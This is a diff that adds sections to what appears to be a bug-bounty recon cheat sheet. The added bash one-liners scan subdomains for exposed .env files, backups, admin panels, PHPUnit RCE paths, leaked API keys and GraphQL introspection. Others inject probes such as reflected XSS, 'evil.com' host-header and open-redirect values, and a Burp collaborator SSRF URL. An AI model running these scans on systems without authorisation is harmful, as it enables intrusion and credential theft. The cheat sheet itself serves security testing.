@@ -804,5 +804,70 @@ subfinder -d target.com | httpx -silent -path-list <(echo -e '/debug\n/_profiler
 cat all_urls.txt | grep '\.js$' | xargs -I{} curl -s {} | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | tee emails_found.txt
 ```
 
+### Cloud Misconfig - Public S3 Buckets
+```bash
+subfinder -d target.com | httpx -silent -path / -hdrs | grep -i 'x-amz-bucket-region' | tee public_s3.txt
+```
+
+### Exposed Admin Panels (Full Auto Discovery)
+```bash
+subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/admin-panels.txt) -mc 200 -o exposed_admins.txt
+```
+
+### Mass Content Injection Check (Reflected Params)
+```bash
+cat all_urls.txt | gf xss | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o reflected_xss.txt
+```
+
+### BONUS — Ultimate ALL Misconfig Scanner (Headers, Panels, Debug, Leaks)
+```bash
+subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t misconfiguration/ -o misconfigs_found.txt
+```
+
+### API Key Leaks in JS Files
+```bash
+cat all_js_urls.txt | xargs -I{} curl -s {} | grep -Eo 'AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24}' | tee leaked_api_keys.txt
+```
+
+### Backup Files Discovery (Think: .bak, .old, .swp)
+```bash
+cat all_urls.txt | sed -E 's/(.*)/\1~\n\1.bak\n\1.old\n\1.swp/' | httpx -silent -mc 200 -o backup_files.txt
+```
+
+### PHP Unit RCE Finder (Real-World Gold)
+```bash
+subfinder -d target.com | httpx -silent -path /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -mc 200 -o phpunit_rce.txt
+```
+
+### GraphQL Misconfig Detection (Introspection Enabled)
+```bash
+cat all_urls.txt | grep 'graphql' | xargs -I{} curl -s -X POST -d '{"query":"{__schema{types{name}}}"}' {} | grep -iq 'types' && echo "{} introspection enabled" >> graphql_misconfigs.txt
+```
+
+### Host Header Injection
+```bash
+cat all_urls.txt | httpx -silent -H 'Host: evil.com' -hdrs | grep -i 'evil.com' | tee host_header_injection.txt
+```
+
+### Open Redirect Finder (Redirection Abuse)
+```bash
+cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'https://evil.com' -o open_redirects.txt
+```
+
+### Session Fixation Detection
+```bash
+cat all_urls.txt | gf login | qsreplace 'sessionid=1234abcd' | httpx -silent -fr '1234abcd' -o session_fixation.txt
+```
+
+### Exposed .env Files (Sensitive Config Exposure)
+```bash
+subfinder -d target.com | httpx -silent -path /.env -mc 200 -o exposed_env.txt
+```
+
+### SSRF Detection (Collaboration Automation)
+```bash
+cat all_urls.txt | gf ssrf | qsreplace 'http://your-collab-url.burpcollaborator.net' | httpx -silent
+```
+
 
 
